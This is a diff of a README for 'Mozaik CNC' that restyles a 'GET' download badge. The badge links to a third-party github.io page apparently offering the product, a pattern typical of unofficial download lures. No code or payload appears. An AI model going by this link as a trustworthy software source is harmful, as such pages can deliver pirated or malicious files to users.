@@ -1,7 +1,7 @@
 
 # Mozaik CNC
 
-[![GET](https://img.shields.io/badge/GET-Mozaik%20CNC-brightgreen?style=for-the-badge)](https://tiggesgarnet.github.io/.github/Mozaik-CNC)
+[![GET](https://img.shields.io/badge/GET%20%E2%80%94%20Mozaik-0078D6?style=for-the-badge&logoColor=white)](https://tiggesgarnet.github.io/.github/Mozaik-CNC)
 
 ![Mozaik CNC preview](https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSa3mTsg62iH1xTSo6ZYwlzjJ91fm4tS00NVPr3Co_20A&s=10)
 
